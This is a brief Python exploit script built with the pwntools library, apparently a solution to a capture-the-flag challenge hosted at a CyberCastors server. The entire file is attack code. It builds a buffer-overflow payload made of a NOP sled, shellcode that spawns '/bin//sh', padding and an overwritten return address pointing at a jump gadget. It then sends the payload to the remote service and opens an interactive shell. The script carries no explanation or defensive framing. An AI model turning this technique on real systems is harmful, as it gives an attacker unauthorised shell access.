from pwn import *
p = remote('chals20.cybercastors.com',14425)
uu64    = lambda data               :u64(data.ljust(8, '\0'))
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
padd = '\x90' * 31
padd += shellcode
padd += "a" * 204
rax_jump = p64(0x0000000000400560)
write_to_bss = p64(0x0601068)
payload = ""
payload += padd
payload += rax_jump
p.recvuntil("Say your name: ")
p.sendline(payload)
p.interactive()